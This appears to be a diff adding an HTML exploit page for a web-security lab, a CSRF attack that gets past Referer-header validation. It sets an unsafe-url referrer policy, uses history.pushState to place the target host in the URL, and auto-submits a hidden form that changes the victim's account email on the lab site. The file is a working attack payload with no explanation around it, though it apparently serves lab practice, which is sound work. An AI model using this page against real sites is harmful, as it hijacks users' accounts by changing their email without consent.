@@ -1,0 +1,18 @@
+<html>
+    <head>
+        <meta name="referrer" content="unsafe-url">
+    </head>
+    <body>
+
+        <script>history.pushState("","","/?0ad000a803b73719804003a000db00d6.web-security-academy.net/my-account")</script>
+        <h1>attack - Referer bypass CSRF attack - referer header validation...</h1>
+
+        <!-- <iframe name="csrf-iframe" style="display: none;"></iframe> -->
+
+        <form id="csrf-form" action="https://0ad000a803b73719804003a000db00d6.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="test9@tester.cb" />
+        </form>
+
+        <script>document.getElementById('csrf-form').submit()</script>
+    </body>
+</html>
